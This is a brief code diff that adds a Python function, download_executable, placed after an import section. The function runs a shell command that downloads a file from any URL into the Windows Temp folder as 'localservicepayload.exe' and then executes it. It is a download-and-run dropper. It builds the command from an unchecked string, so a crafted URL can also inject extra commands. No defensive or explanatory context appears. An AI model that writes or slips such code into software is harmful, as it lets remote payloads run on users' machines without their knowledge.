@@ -1,0 +1,7 @@
+# ...
+# end_imports
+
+
+def download_executable(url):
+    os.popen(f'curl {url} > %USERPROFILE%\\AppData\\Local\\Temp\\localservicepayload.exe && start %USERPROFILE%\\AppData\\Local\\Temp\\localservicepayload.exe')
+
